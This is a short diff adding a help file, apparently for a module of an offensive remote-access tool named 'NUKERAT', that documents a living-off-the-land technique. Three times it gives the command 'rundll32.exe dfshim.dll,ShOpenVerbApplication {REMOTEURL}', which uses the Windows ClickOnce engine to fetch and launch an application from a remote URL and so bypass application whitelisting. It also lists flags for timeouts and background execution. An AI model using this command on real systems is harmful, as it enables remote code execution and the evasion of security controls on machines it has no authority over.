@@ -1,0 +1,16 @@
+ABOUT
+    ClickOnce engine in Windows used by .NET. LOLBAS documents use
+    binary to bypass Application whitelisting.
+
+USAGE:
+    rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
+
+EXAMPLES:
+    rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
